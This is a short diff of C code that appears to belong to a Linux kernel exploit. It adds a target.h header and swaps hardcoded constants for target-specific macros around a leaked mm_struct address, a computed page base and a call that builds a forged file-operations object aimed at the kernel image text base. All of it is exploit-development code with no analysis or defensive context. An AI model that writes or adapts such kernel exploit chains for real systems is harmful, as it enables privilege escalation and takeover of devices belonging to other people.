@@ -9,6 +9,7 @@
 #include "04_fake_kernel_objects.h"
 #include "skb_send_probe.h"
 #include "mm_leak.h"
+#include "target.h"
 
 int main(void) {
   uint64_t mm_struct_addr = 0;
@@ -18,9 +19,9 @@ int main(void) {
   }
   printf("mm_struct=%016llx\n", (unsigned long long)mm_struct_addr);
 
-  static unsigned char scratch[FOPS_INSTALL_PAGE_SIZE];
-  uint64_t page_base = mm_struct_addr & ~0x7fffULL;
-  build_fops_install_object(scratch, page_base, 0xffffffc008000000ULL,
+  static unsigned char scratch[TARGET_RECLAIM_BUFFER_SIZE];
+  uint64_t page_base = mm_struct_addr & ~(TARGET_ORDER3_SIZE - 1ULL);
+  build_fops_install_object(scratch, page_base, TARGET_KIMAGE_TEXT_BASE,
                              0xdeadbeefULL, 0xcafebabeULL);
   printf("page_base=%016llx\n", (unsigned long long)page_base);
 
